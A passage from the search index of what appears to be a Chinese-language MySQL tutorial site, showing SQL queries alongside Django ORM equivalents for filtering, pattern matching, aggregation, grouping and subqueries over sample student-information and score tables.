\u7535\u5b50\u4fe1\u606f                 | 2018-09-01      |\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | 141992199701078600 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b                 | 2018-09-01      |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n6 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_7","title":"\u5e26\u6761\u4ef6\u67e5\u8be2","text":""},{"location":"mysql/query/#_8","title":"\u7b80\u5355\u641c\u7d22\u6761\u4ef6","text":"<p>\u4e0d\u7b49\u4e8e\u53ef\u4ee5\u4f7f\u7528<code>&lt;&gt;</code>\u6216<code>!=</code> :</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_info where department &lt;&gt; '\u8ba1\u7b97\u673a\u5b66\u9662';\n</code></pre> <pre><code>StudentInfo.objects.filter(~Q(department='\u8ba1\u7b97\u673a\u5b66\u9662'))\n</code></pre> result<pre><code>+----------+-----------+------+--------------------+--------------+-----------------+-----------------+\n| number   | name      | sex  | id_number          | department   | major           | enrollment_time |\n+----------+-----------+------+--------------------+--------------+-----------------+-----------------+\n| 20180105 | \u8303\u5251      | \u7537   | 181048199308156368 | \u822a\u5929\u5b66\u9662     | \u98de\u884c\u5668\u8bbe\u8ba1      | 2018-09-01      |\n| 20180106 | \u6731\u9038\u7fa4    | \u7537   | 197995199501078445 | \u822a\u5929\u5b66\u9662     | \u7535\u5b50\u4fe1\u606f        | 2018-09-01      |\n+----------+-----------+------+--------------------+--------------+-----------------+-----------------+\n2 rows in set (0.00 sec)\n</code></pre> <p>\u533a\u95f4\u5185\u4f7f\u7528<code>between...and...</code>\uff0c\u4e0d\u5728\u67d0\u533a\u95f4\u4f7f\u7528<code>not between...and...</code>:</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_info where number between 20180103 and 20180105;\nmysql&gt; select * from student_info where number not between 20180103 and 20180105;\n</code></pre> <pre><code>StudentInfo.objects.filter(number__range=(20180103, 20180105))\nStudentInfo.objects.filter(~Q(number__range=(20180103, 20180105)))\n</code></pre> result<pre><code>+----------+-----------+------+--------------------+-----------------+-----------------+-----------------+\n| number   | name      | sex  | id_number          | department      | major           | enrollment_time |\n+----------+-----------+------+--------------------+-----------------+-----------------+-----------------+\n| 20180103 | \u8303\u7edf      | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b        | 2018-09-01      |\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | 141992199701078600 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b        | 2018-09-01      |\n| 20180105 | \u8303\u5251      | \u7537   | 181048199308156368 | \u822a\u5929\u5b66\u9662        | \u98de\u884c\u5668\u8bbe\u8ba1      | 2018-09-01      |\n+----------+-----------+------+--------------------+-----------------+-----------------+-----------------+\n3 rows in set (0.01 sec)\n\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| number   | name      | sex  | id_number          | department      | major                    | enrollment_time |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | 158177199901044792 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | 151008199801178529 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180106 | \u6731\u9038\u7fa4    | \u7537   | 197995199501078445 | \u822a\u5929\u5b66\u9662        | \u7535\u5b50\u4fe1\u606f                 | 2018-09-01      |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n3 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_9","title":"\u5339\u914d\u5217\u8868\u4e2d\u7684\u5143\u7d20","text":"<p>\u4f7f\u7528<code>in (...)</code>\u548c<code>not in</code>\u7b5b\u9009\u51fa\u5728\u67d0\u4e2a\u5217\u8868\u4e2d\u7684\u8bb0\u5f55:</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_info where major in ('\u8f6f\u4ef6\u5de5\u7a0b',  '\u7535\u5b50\u4fe1\u606f');\n</code></pre> <pre><code>StudentInfo.objects.filter(major__in=('\u8f6f\u4ef6\u5de5\u7a0b', '\u7535\u5b50\u4fe1\u606f'))\n</code></pre> result<pre><code>+----------+-----------+------+--------------------+-----------------+--------------+-----------------+\n| number   | name      | sex  | id_number          | department      | major        | enrollment_time |\n+----------+-----------+------+--------------------+-----------------+--------------+-----------------+\n| 20180103 | \u8303\u7edf      | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b     | 2018-09-01      |\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | 141992199701078600 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b     | 2018-09-01      |\n| 20180106 | \u6731\u9038\u7fa4    | \u7537   | 197995199501078445 | \u822a\u5929\u5b66\u9662        | \u7535\u5b50\u4fe1\u606f     | 2018-09-01      |\n+----------+-----------+------+--------------------+-----------------+--------------+-----------------+\n3 rows in set (0.00 sec)\n</code></pre> <p>\u4f7f\u7528<code>is null</code> \u548c <code>is not null</code>\u53ef\u7b5b\u9009\u51fa\u67d0\u5217\u662fNULL\u7684\u8bb0\u5f55\uff0c\u800c\u4e0d\u80fd\u4f7f\u7528\u666e\u901a\u7684\u64cd\u4f5c\u7b26\u4f8b\u5982\u7b49\u53f7\u6765\u8fdb\u884c\u6bd4\u8f83\uff0cNULL\u4ee3\u8868\u6ca1\u6709\u503c\u3002</p>"},{"location":"mysql/query/#_10","title":"\u591a\u4e2a\u641c\u7d22\u6761\u4ef6","text":"<p>AND\u4f18\u5148\u7ea7\u9ad8\u4e8eOR:</p> MySQLDjango ORM <pre><code>mysql&gt; SELECT * FROM student_score WHERE score &gt; 95 OR score &lt; 55 AND subject = '\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907';\n</code></pre> <pre><code>StudentScore.objects.filter(Q(score__gt=95) | Q(score__lt=55) &amp; Q(subject='\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907'))\n</code></pre> result<pre><code>+----------+-----------------------------+-------+\n| number   | subject                     | score |\n+----------+-----------------------------+-------+\n| 20180102 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |   100 |\n| 20180102 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    98 |\n| 20180104 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    46 |\n+----------+-----------------------------+-------+\n3 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_11","title":"\u6a21\u7cca\u67e5\u8be2","text":"<p>\u4f7f\u7528<code>like</code>\u548c<code>not like</code>\u8fdb\u884c\u6a21\u7cca\u5339\u914d\u67e5\u8be2\uff0c<code>%</code>\u4ee3\u8868\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c<code>_</code>\u4ee3\u8868\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26:</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_info where name like '\u675c_';\nmysql&gt; select * from student_info where name like '\u8303_';\nmysql&gt; select * from student_info where name like '%\u675c%';\n</code></pre> <pre><code>StudentInfo.objects.extra(where=[\"name LIKE '\u675c_'\"]) # django\u4e0d\u652f\u6301_\u5b57\u7b26\nStudentInfo.objects.extra(where=[\"name LIKE '\u8303_'\"])\nStudentInfo.objects.filter(name__contains='\u675c')\n</code></pre> result<pre><code>Empty set (0.00 sec)\n\n+----------+--------+------+--------------------+-----------------+-----------------+-----------------+\n| number   | name   | sex  | id_number          | department      | major           | enrollment_time |\n+----------+--------+------+--------------------+-----------------+-----------------+-----------------+\n| 20180103 | \u8303\u7edf   | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b        | 2018-09-01      |\n| 20180105 | \u8303\u5251   | \u7537   | 181048199308156368 | \u822a\u5929\u5b66\u9662        | \u98de\u884c\u5668\u8bbe\u8ba1      | 2018-09-01      |\n+----------+--------+------+--------------------+-----------------+-----------------+-----------------+\n2 rows in set (0.00 sec)\n\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| number   | name      | sex  | id_number          | department      | major                    | enrollment_time |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | 158177199901044792 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | 151008199801178529 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n2 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_12","title":"\u51fd\u6570\u548c\u8868\u8fbe\u5f0f","text":""},{"location":"mysql/query/#_13","title":"\u8868\u8fbe\u5f0f","text":"<p>\u53ef\u4ee5\u5c06\u8868\u8fbe\u5f0f\u653e\u5728\u67e5\u8be2\u5217\u8868\u4e2d:</p> MySQLDjango ORM <pre><code>mysql&gt; select number,subject,score+100 from student_score;\n</code></pre> <pre><code>StudentScore.objects.annotate(myscore=F('score')+100).values('number', 'subject', 'myscore')\n</code></pre> result<pre><code>+----------+-----------------------------+-----------+\n| number   | subject                     | score+100 |\n+----------+-----------------------------+-----------+\n| 20180101 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |       178 |\n| 20180101 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |       188 |\n| 20180102 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |       200 |\n| 20180102 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |       198 |\n| 20180103 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |       159 |\n| 20180103 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |       161 |\n| 20180104 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |       155 |\n| 20180104 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |       146 |\n+----------+-----------------------------+-----------+\n8 rows in set (0.00 sec)\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u628a\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u641c\u7d22\u7684\u6761\u4ef6:</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_score where score%3=0;\n</code></pre> <pre><code>StudentScore.objects.annotate(myscore=Mod('score',3)).filter(myscore=0)\n</code></pre> result<pre><code>+----------+-----------------------+-------+\n| number   | subject               | score |\n+----------+-----------------------+-------+\n| 20180101 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406        |    78 |\n+----------+-----------------------+-------+\n1 row in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_14","title":"\u6587\u672c\u5904\u7406","text":"<p>\u8fde\u63a5\u5b57\u7b26\u4e32:</p> MySQLDjango ORM <pre><code>mysql&gt; select concat('\u5b66\u53f7\u4e3a',number,'\u7684\u5b66\u751f\u5728[',subject,']\u7684\u6210\u7ee9\u4e3a',score) from student_score;\n</code></pre> <pre><code>StudentScore.objects.annotate(mytest=Concat(Value('\u5b66\u53f7\u4e3a'), 'number',Value('\u7684\u5b66\u751f\u5728['), 'subject', Value(']\u7684\u6210\u7ee9\u4e3a'), 'score', output_field=CharField()))\n</code></pre> result<pre><code>+--------------------------------------------------------------------------+\n| concat('\u5b66\u53f7\u4e3a',number,'\u7684\u5b66\u751f\u5728[',subject,']\u7684\u6210\u7ee9\u4e3a',score)            |\n+--------------------------------------------------------------------------+\n| \u5b66\u53f7\u4e3a20180101\u7684\u5b66\u751f\u5728[\u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406]\u7684\u6210\u7ee9\u4e3a78                         |\n| \u5b66\u53f7\u4e3a20180101\u7684\u5b66\u751f\u5728[\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907]\u7684\u6210\u7ee9\u4e3a88                     |\n| \u5b66\u53f7\u4e3a20180102\u7684\u5b66\u751f\u5728[\u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406]\u7684\u6210\u7ee9\u4e3a100                        |\n| \u5b66\u53f7\u4e3a20180102\u7684\u5b66\u751f\u5728[\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907]\u7684\u6210\u7ee9\u4e3a98                     |\n| \u5b66\u53f7\u4e3a20180103\u7684\u5b66\u751f\u5728[\u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406]\u7684\u6210\u7ee9\u4e3a59                         |\n| \u5b66\u53f7\u4e3a20180103\u7684\u5b66\u751f\u5728[\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907]\u7684\u6210\u7ee9\u4e3a61                     |\n| \u5b66\u53f7\u4e3a20180104\u7684\u5b66\u751f\u5728[\u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406]\u7684\u6210\u7ee9\u4e3a55                         |\n| \u5b66\u53f7\u4e3a20180104\u7684\u5b66\u751f\u5728[\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907]\u7684\u6210\u7ee9\u4e3a46                     |\n+--------------------------------------------------------------------------+\n8 rows in set (0.00 sec)\n</code></pre> <p>\u5b50\u4e32:</p> MySQLDjango ORM <pre><code>mysql&gt; select substring(number, 4, 5) as \u5b66\u53f7\u5c3e\u53f7 from student_info;\n</code></pre> <pre><code>StudentScore.objects.annotate(num=Substr('number', 4,5)).values('num')\n</code></pre> result<pre><code>+--------------+\n| \u5b66\u53f7\u5c3e\u53f7     |\n+--------------+\n| 80104        |\n| 80102        |\n| 80101        |\n| 80103        |\n| 80105        |\n| 80106        |\n+--------------+\n6 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_15","title":"\u65f6\u95f4\u5904\u7406\u51fd\u6570","text":"<p>\u65f6\u95f4\u95f4\u9694: <pre><code>mysql&gt; select date_add('2015-01-01 10:20:33', interval 2 minute);\n+----------------------------------------------------+\n| date_add('2015-01-01 10:20:33', interval 2 minute) |\n+----------------------------------------------------+\n| 2015-01-01 10:22:33                                |\n+----------------------------------------------------+\n1 row in set (0.00 sec)\n</code></pre></p> <p>\u65f6\u95f4\u683c\u5f0f\u5316: <pre><code>mysql&gt; select date_format(now(), '%b/%d/%Y %h:%i:%s~%p');\n+--------------------------------------------+\n| date_format(now(), '%b/%d/%Y %h:%i:%s~%p') |\n+--------------------------------------------+\n| Dec/02/2019 04:57:31~PM                    |\n+--------------------------------------------+\n1 row in set (0.00 sec)\n</code></pre></p>"},{"location":"mysql/query/#_16","title":"\u805a\u96c6\u51fd\u6570","text":"<p>COUNT\u7528\u6765\u7edf\u8ba1\u884c\u6570 * <code>COUNT(*)</code>\u7edf\u8ba1\u8868\u4e2d\u6240\u6709\u7684\u884c\uff0c\u5305\u62ecNULL * <code>COUNT(\u5217\u540d)</code>\u7edf\u8ba1\u8868\u4e2d\u67d0\u5217\u7684\u6240\u6709\u884c\uff0c\u4e0d\u5305\u62ecNULL</p> MySQLDjango ORM <pre><code>mysql&gt; select count(*) from student_info;\nmysql&gt; select count(distinct subject) from student_score;\n</code></pre> <pre><code>StudentInfo.objects.count()\nStudentScore.objects.values('subject').distinct().count()\n</code></pre> result<pre><code>+----------+\n| count(*) |\n+----------+\n|        6 |\n+----------+\n1 row in set (0.00 sec)\n\n+-------------------------+\n| count(distinct subject) |\n+-------------------------+\n|                       2 |\n+-------------------------+\n1 row in set (0.00 sec)\n</code></pre> <p>SUM\u548cAVG:</p> MySQLDjango ORM <pre><code>mysql&gt; select sum(score) from student_score;\nmysql&gt; select avg(score) from student_score where subject=\"\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907\";\n</code></pre> <pre><code>StudentScore.objects.aggregate(Sum('score'))\nStudentScore.objects.filter(subject='\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907').aggregate(Avg('score'))\n</code></pre> result<pre><code>+------------+\n| sum(score) |\n+------------+\n|        585 |\n+------------+\n1 row in set (0.00 sec)\n\n+------------+\n| avg(score) |\n+------------+\n|    73.2500 |\n+------------+\n1 row in set (0.00 sec)\n</code></pre> <p>\u7ec4\u5408\u4f7f\u7528:</p> MySQLDjango ORM <pre><code>mysql&gt; select count(*) as \u6210\u7ee9\u8bb0\u5f55\u603b\u6570, max(score) as \u6700\u9ad8\u5206, min(score) as \u6700\u4f4e\u5206,avg(score) as \u5e73\u5747\u5206 from student_score;\n</code></pre> <pre><code>StudentScore.objects.aggregate(Max('score'), Min('score'),Avg('score'), nsum=Count('*'))\n</code></pre> result<pre><code>+--------------------+-----------+-----------+-----------+\n| \u6210\u7ee9\u8bb0\u5f55\u603b\u6570       | \u6700\u9ad8\u5206    | \u6700\u4f4e\u5206    | \u5e73\u5747\u5206    |\n+--------------------+-----------+-----------+-----------+\n|                  8 |       100 |        46 |   73.1250 |\n+--------------------+-----------+-----------+-----------+\n1 row in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_17","title":"\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362","text":"<p>Mysql\u4f1a\u5c3d\u91cf\u628a\u503c\u8f6c\u6362\u4e3a\u8868\u8fbe\u5f0f\u4e2d\u9700\u8981\u7684\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u4ea7\u751f\u9519\u8bef: <pre><code>mysql&gt; select 1 + '2';\n+---------+\n| 1 + '2' |\n+---------+\n|       3 |\n+---------+\n1 row in set (0.00 sec)\n\nmysql&gt; select '23sds'+17;\n+------------+\n| '23sds'+17 |\n+------------+\n|         40 |\n+------------+\n1 row in set, 1 warning (0.00 sec)\n</code></pre></p> <p>\u4f46\u8fd9\u79cd\u8f6c\u6362\u4e0d\u80fd\u7528\u4e8e\u5b58\u50a8\u6570\u636e: <pre><code>mysql&gt; insert into student_score(score,number,subject) values (100,20180101,300);\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; insert into student_score(score,number,subject) values ('100',20180101,400);\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; insert into student_score(score,number,subject) values ('asd',20180101,400);\nERROR 1366 (HY000): Incorrect integer value: 'asd' for column 'score' at row 1\n</code></pre></p>"},{"location":"mysql/query/#_18","title":"\u5206\u7ec4\u67e5\u8be2","text":""},{"location":"mysql/query/#_19","title":"\u57fa\u7840\u67e5\u8be2","text":"<p>\u5206\u7ec4\u5c31\u662f\u9488\u5bf9\u67d0\u4e2a\u5217\uff0c\u5c06\u8be5\u5217\u7684\u503c\u76f8\u540c\u7684\u8bb0\u5f55\u5206\u5230\u4e00\u4e2a\u7ec4\u4e2d:</p> MySQLDjango ORM <pre><code>mysql&gt; select subject, sum(score) from student_score group by subject;\n</code></pre> <pre><code>StudentScore.objects.values('subject').annotate(myscore=Sum('score'))\n</code></pre> result<pre><code>+-----------------------------+------------+\n| subject                     | sum(score) |\n+-----------------------------+------------+\n| \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |        292 |\n| \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |        293 |\n+-----------------------------+------------+\n2 rows in set (0.00 sec)\n</code></pre> <p>\u628a\u975e\u5206\u7ec4\u5217\u653e\u5165\u67e5\u8be2\u5217\u8868\u4e2d\u4f1a\u5f15\u8d77\u4e89\u8bae\uff0c\u5bfc\u81f4\u7ed3\u679c\u4e0d\u786e\u5b9a: <pre><code>mysql&gt; select subject, sum(score),number from student_score group by subject;\nERROR 1055 (42000): Expression #3 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'student.student_score.number' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by\n</code></pre></p>"},{"location":"mysql/query/#_20","title":"\u5206\u7ec4\u548c\u8fc7\u6ee4\u6761\u4ef6","text":"<p>\u662f\u5148\u8fc7\u6ee4\u51fa\u7b26\u5408\u6761\u4ef6\u7684\u6570\u636e\uff0c\u5728\u8fdb\u884c\u5206\u7ec4\u8fd0\u7b97\u7684:</p> MySQLDjango ORM <pre><code>mysql&gt; select subject, sum(score) from student_score where score&gt;70 group by subject;\n</code></pre> <pre><code>StudentScore.objects.filter(score__gt=70).values('subject').annotate(myscore=Sum('score'))\n</code></pre> result<pre><code>+-----------------------------+------------+\n| subject                     | sum(score) |\n+-----------------------------+------------+\n| \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |        178 |\n| \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |        186 |\n+-----------------------------+------------+\n2 rows in set (0.00 sec)\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u5206\u7ec4\u540e\uff0c\u5728\u7b5b\u9009\u51fa\u5408\u9002\u7684\u5206\u7ec4:</p> MySQLDjango ORM <pre><code>mysql&gt; select subject, sum(score) from student_score group by subject having max(score)&gt;98;\n</code></pre> <pre><code>StudentScore.objects.values('subject').annotate(sumscore=Sum('score'), mscore=Max('score')).filter(mscore__gt=98)\n</code></pre> result<pre><code>+-----------------------+------------+\n| subject               | sum(score) |\n+-----------------------+------------+\n| \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406        |        292 |\n+-----------------------+------------+\n1 row in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_21","title":"\u5206\u7ec4\u548c\u6392\u5e8f","text":"MySQLDjango ORM <pre><code>mysql&gt; select subject, sum(score) as sum_s from student_score group by subject order by sum_s desc;\n</code></pre> <pre><code>StudentScore.objects.values('subject').annotate(sum_s=Sum('score')).order_by('-sum_s')\n</code></pre> result<pre><code>+-----------------------------+-------+\n| subject                     | sum_s |\n+-----------------------------+-------+\n| \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |   293 |\n| \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |   292 |\n+-----------------------------+-------+\n2 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_22","title":"\u5d4c\u5957\u5206\u7ec4","text":"<p>\u5982\u4e0b\u4f8b\uff0c\u53ef\u5148\u6309department\u5206\u6210\u5927\u7ec4\uff0c\u518d\u6309major\u5206\u4e3a\u5c0f\u7ec4:</p> MySQLDjango ORM <pre><code>mysql&gt; select department, major, count(*) from student_info group by department, major;\n</code></pre> <pre><code>StudentInfo.objects.values('department','major').annotate(sum_c=Count('*'))\n</code></pre> result<pre><code>+-----------------+--------------------------+----------+\n| department      | major                    | count(*) |\n+-----------------+--------------------------+----------+\n| \u822a\u5929\u5b66\u9662        | \u7535\u5b50\u4fe1\u606f                 |        1 |\n| \u822a\u5929\u5b66\u9662        | \u98de\u884c\u5668\u8bbe\u8ba1               |        1 |\n| \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         |        2 |\n| \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b                 |        2 |\n+-----------------+--------------------------+----------+\n4 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_23","title":"\u6ce8\u610f\u4e8b\u9879","text":"<ol> <li>\u5982\u679c\u5206\u7ec4\u5217\u4e2d\u6709NULL\u503c\uff0c\u90a3\u4e48NULL\u4f1a\u4f5c\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u5206\u7ec4</li> <li>\u5982\u679c\u662f\u5d4c\u5957\u5206\u7ec4\uff0c\u805a\u96c6\u51fd\u6570\u5c06\u4f5c\u7528\u5728\u6700\u540e\u7684\u5206\u7ec4\u5217\u4e0a</li> <li>\u975e\u5206\u7ec4\u5217\u4e0d\u80fd\u5355\u72ec\u51fa\u73b0\u5728\u68c0\u7d22\u5217\u8868\u4e2d(\u53ef\u4ee5\u88ab\u653e\u5230\u805a\u96c6\u51fd\u6570\u4e2d)</li> <li>GROUP BY\u5b50\u53e5\u540e\u53ef\u4ee5\u8ddf\u968f\u8868\u8fbe\u5f0f(\u4f46\u4e0d\u80fd\u662f\u805a\u96c6\u51fd\u6570)</li> </ol> <p>\u7b80\u5355\u67e5\u8be2\u8bed\u53e5\u4e2d\u5404\u5b50\u53e5\u7684\u987a\u5e8f\u4e3a: <pre><code>SELECT [DISTINCT] \u67e5\u8be2\u5217\u8868\n[FROM \u8868\u540d]\n[WHERE \u5e03\u5c14\u8868\u8fbe\u5f0f]\n[GROUP BY \u5206\u7ec4\u5217\u8868 ]\n[HAVING \u5206\u7ec4\u8fc7\u6ee4\u6761\u4ef6]\n[ORDER BY \u6392\u5e8f\u5217\u8868]\n[LIMIT \u5f00\u59cb\u884c, \u9650\u5236\u6761\u6570]\n</code></pre></p>"},{"location":"mysql/query/#_24","title":"\u5b50\u67e5\u8be2","text":""},{"location":"mysql/query/#_25","title":"\u6807\u91cf\u5b50\u67e5\u8be2","text":"<p>\u6807\u91cf\u5b50\u67e5\u8be2\u5355\u7eaf\u7684\u4ee3\u8868\u4e00\u4e2a\u503c\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u8868\u8fbe\u5f0f\u53c2\u4e0e\u8fd0\u7b97\u6216\u4f5c\u4e3a\u641c\u7d22\u6761\u4ef6:</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_score where number=(select number from student_info where name='\u8303\u7edf');\n</code></pre> <pre><code>StudentScore.objects.filter(number=Subquery(StudentInfo.objects.filter(name='\u8303\u7edf').values('number')))\n</code></pre> result<pre><code>+----------+-----------------------------+-------+\n| number   | subject                     | score |\n+----------+-----------------------------+-------+\n| 20180103 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    59 |\n| 20180103 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    61 |\n+----------+-----------------------------+-------+\n2 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_26","title":"\u5217\u5b50\u67e5\u8be2","text":"<p>\u5185\u5c42\u67e5\u8be2\u7ed3\u679c\u4e0d\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u503c\uff0c\u800c\u662f\u4e00\u4e2a\u5217: <pre><code>mysql&gt; select * from student_score where number=(select number from student_info where sex='\u7537');\nERROR 1242 (21000): Subquery returns more than 1 row\n</code></pre></p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_score where number in (select number from student_info where sex='\u7537');\n</code></pre> <pre><code>StudentScore.objects.filter(number__in=Subquery(StudentInfo.objects.filter(sex='\u7537').values('number')))\n</code></pre> result<pre><code>+----------+-----------------------------+-------+\n| number   | subject                     | score |\n+----------+-----------------------------+-------+\n| 20180101 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    78 |\n| 20180101 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    88 |\n| 20180103 | \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406              |    59 |\n| 20180103 | \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907          |    61 |\n+----------+-----------------------------+-------+\n4 rows in set (0.00 sec)\n</code></pre> <p>\u800c\u884c\u5b50\u67e5\u8be2\u3001\u8868\u5b50\u67e5\u8be2\u4e0d\u5e38\u7528\uff0c\u7701\u7565\u3002</p>"},{"location":"mysql/query/#exists","title":"EXISTS\u548c\u76f8\u5173\u5b50\u67e5\u8be2","text":"<p>EXISTS\u548cNOT EXISTS\u5355\u72ec\u770b\u5f88\u50cf\u4e00\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u67e5\u8be2\u7ed3\u679c\u662f\u5426\u4e3a\u7a7a\u96c6: <pre><code>mysql&gt; select exists (select * from student_info where number=20180101);\n+-----------------------------------------------------------+\n| exists (select * from student_info where number=20180101) |\n+-----------------------------------------------------------+\n|                                                         1 |\n+-----------------------------------------------------------+\n1 row in set (0.00 sec)\n\nmysql&gt; select not exists (select * from student_info where number=20180101);\n+---------------------------------------------------------------+\n| not exists (select * from student_info where number=20180101) |\n+---------------------------------------------------------------+\n|                                                             0 |\n+---------------------------------------------------------------+\n1 row in set (0.00 sec)\n</code></pre></p> <p>\u4e4b\u524d\u6211\u4eec\u5c1d\u8bd5\u7684\u90fd\u662f\u4e0d\u76f8\u5173\u5b50\u67e5\u8be2\uff0c\u800c\u76f8\u5173\u5b50\u67e5\u8be2\u5c31\u662f\u5185\u5c42\u67e5\u8be2\u8bed\u53e5\u8981\u7528\u5230\u5916\u5c42\u67e5\u8be2\u8bed\u53e5\u7684\u503c\uff0c\u6bd4\u5982\u6211\u4eec\u67e5\u5b66\u751f\u7684\u57fa\u672c\u4fe1\u606f\u5e76\u8981\u6c42\u8fd9\u4e9b\u5b66\u751f\u6709\u6210\u7ee9\u7684\u8bb0\u5f55: <pre><code>mysql&gt; select * from student_info where exists(select * from student_score where student_score.number=student_info.number);\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| number   | name      | sex  | 